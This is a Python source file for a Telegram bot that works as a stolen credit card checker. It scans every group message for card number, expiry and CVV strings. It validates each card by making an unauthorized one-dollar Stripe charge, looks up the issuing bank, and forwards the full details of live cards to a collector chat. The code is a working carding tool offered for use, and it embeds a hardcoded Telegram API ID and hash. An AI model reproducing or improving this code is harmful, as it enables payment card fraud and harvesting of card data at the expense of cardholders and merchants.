import time
import re
import json
import aiohttp
import asyncio
import logging
from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.types import Message

# Configuration
API_ID = 24509589  # Your API ID
API_HASH = "717cf21d94c4934bcbe1eaa1ad86ae75"  # Your API Hash
BOT_TOKEN = ""  # Your Bot Token
PK_KEY = ""  # Your Stripe Publishable Key
SK_KEY = ""  # Your Stripe Secret Key
TARGET_CHAT_ID = -100  # Replace with the correct target group chat ID

# Constants
CARD_PATTERN = re.compile(r"(\d{15,16})[|/: ](\d{1,2})[|/: ](\d{2,4})[|/: ](\d{3,4})")  # Regex to detect card details
MAX_RETRIES = 3
RETRY_DELAY = 1
DEFAULT_AMOUNT = 1  # Default charge amount in USD

# Logging Configuration
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Initialize Pyrogram client
app = Client("card_checker_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Function to fetch BIN information
async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                return "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError as e:
            logger.error(f"Error fetching BIN info: {e}")
            return "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"

# Function to check card details
async def check_card(card_info, charge_amount):
    card = card_info.strip()
    if not card:
        return "❌ **Invalid card details**"

    # Extract card details using regex
    match = CARD_PATTERN.match(card)
    if not match:
        return "❌ **Invalid card format. Please use: `card_number|mm|yy|cvv`**"

    cc, mes, ano, cvv = match.groups()

    # Fetch BIN information
    brand, card_type, level, bank, country, flag = await get_bin_info(cc[:6])

    token_data = {
        'type': 'card',
        "card[number]": cc,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "card[cvc]": cvv,
    }

    headers = {
        "Authorization": f"Bearer {PK_KEY}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    token_id = None
    for attempt in range(MAX_RETRIES):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post("https://api.stripe.com/v1/payment_methods", data=token_data, headers=headers) as response:
                    if response.status == 200:
                        token_data_response = await response.json()
                        token_id = token_data_response.get("id", "")
                        break
                    else:
                        error_message = (await response.json()).get("error", {}).get("message", "Unknown error")
                        if response.status == 429 or "Request rate limit exceeded" in error_message:
                            if attempt < MAX_RETRIES - 1:
                                await asyncio.sleep(RETRY_DELAY)
                            else:
                                return f"❌ **Token creation failed**: {error_message}"
                        else:
                            return f"❌ **Token creation failed**: {error_message}"
        except aiohttp.ClientError as e:
            logger.error(f"Network error: {e}")
            return f"❌ **Network error**: {str(e)}"

    if not token_id:
        return "❌ **Token creation failed**: No token ID received"

    charge_data = {
        "amount": int(charge_amount) * 100,
        "currency": "usd",
        'payment_method_types[]': 'card',
        "description": "Charge for product/service",
        'payment_method': token_id,
        'confirm': 'true',
        'off_session': 'true'
    }

    headers = {
        "Authorization": f"Bearer {SK_KEY}",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post("https://api.stripe.com/v1/payment_intents", data=charge_data, headers=headers) as response:
                charges = await response.text()
    except aiohttp.ClientError as e:
        logger.error(f"Charge error: {e}")
        return f"❌ **Charge error**: {str(e)}"

    try:
        charges_dict = json.loads(charges)
        charge_error = charges_dict.get("error", {}).get("decline_code", "Unknown error")
        charge_message = charges_dict.get("error", {}).get("message", "No message available")
    except json.JSONDecodeError:
        charge_error = "Unknown error (Invalid JSON response)"
        charge_message = "No message available"

    elapsed_time = round(time.time() - time.time(), 2)

    if '"status": "succeeded"' in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        resp = f"Charged {charge_amount}$🔥"
    elif '"cvc_check": "pass"' in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
        resp = "CVV Live✅"
    elif "insufficient_funds" in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        resp = "Insufficient funds 💰"
    elif '"code": "incorrect_cvc"' in charges:
        status = "𝗖𝗖𝗡 𝗟𝗶𝘃𝗲 ❎"
        resp = "Your card's security code is incorrect."
    elif "transaction_not_allowed" in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
        resp = "Card Doesn't Support Purchase ❎"
    elif "authentication_required" in charges or "card_error_authentication_required" in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
        resp = "3D Secured❎"
    elif "requires_action" in charges or '"status": "requires_action"' in charges:
        status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎"
        resp = "3D Secured❎"
    elif '"code": "rate_limit"' in charges:
        status = "Rate Limit ⚠️"
        resp = "Request rate limit exceeded"
    elif "generic_decline" in charges:
        status = "Declined ❌"
        resp = "Generic Decline"
    elif "fraudulent" in charges:
        status = "Declined ❌"
        resp = "Fraudulent"
    elif "do_not_honor" in charges:
        status = "Declined ❌"
        resp = "Do Not Honor"
    elif "invalid_expiry_month" in charges:
        status = "Declined ❌"
        resp = "The card expiration date provided is invalid."
    elif "invalid_account" in charges:
        status = "Declined ❌"
        resp = "The account linked to the card is invalid."
    elif "lost_card" in charges:
        status = "Declined ❌"
        resp = "The card has been reported as lost and the transaction was declined."
    elif "stolen_card" in charges:
        status = "Declined ❌"
        resp = "The card has been reported as stolen and the transaction was declined."
    elif "pickup_card" in charges:
        status = "Declined ❌"
        resp = "Pickup Card"
    elif "Your card has expired." in charges:
        status = "Declined ❌"
        resp = "Expired Card"
    elif "card_decline_rate_limit_exceeded" in charges:
        status = "Declined ❌"
        resp = "Rate limit"
    elif '"code": "processing_error"' in charges:
        status = "Declined ❌"
        resp = "Processing error"
    elif '"message": "Your card number is incorrect."' in charges:
        status = "Declined ❌"
        resp = "Your card number is incorrect."
    elif "incorrect_number" in charges:
        status = "Declined ❌"
        resp = "Card number is invalid."
    elif "testmode_charges_only" in charges:
        status = "Declined ❌"
        resp = "The SK key is in test mode or invalid. Please use a valid key."
    elif "api_key_expired" in charges:
        status = "Declined ❌"
        resp = "The API key used for the transaction has expired."
    elif "parameter_invalid_empty" in charges:
        status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
        resp = "Please enter valid card details to check."
    else:
        status = f"{charge_error}"
        resp = f"{charge_message}"

    result_message = (
        f"**{status}**\n\n"
        f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mes}|{ano}|{cvv}`\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ SK Based {charge_amount}$ XVV\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ **{resp}**\n\n"
        f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
        f"𝗧𝗶𝗺𝗲 ⇾ {elapsed_time:.2f} **Seconds**\n"
    )

    return status, result_message

# Monitor all groups for new card details
@app.on_message(filters.text)
async def monitor_groups(client, message: Message):
    # Extract card details from the message
    card_info = None
    if message.text:
        match = CARD_PATTERN.search(message.text)
        if match:
            card_info = match.group()

    if not card_info:
        return  # Skip if no valid card details are found

    # Check the card
    status, result_message = await check_card(card_info, DEFAULT_AMOUNT)

    # Send approved/live cards to the target group
    if status in ["𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅", "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ❎", "CVV Live✅"]:
        try:
            await app.send_message(
                TARGET_CHAT_ID,
                result_message,
                parse_mode=ParseMode.MARKDOWN
            )
        except Exception as e:
            logger.error(f"Failed to send message to target group: {e}")
            logger.error(f"Target Chat ID: {TARGET_CHAT_ID}")
            logger.error(f"Error Details: {str(e)}")

# Start the bot
app.run()
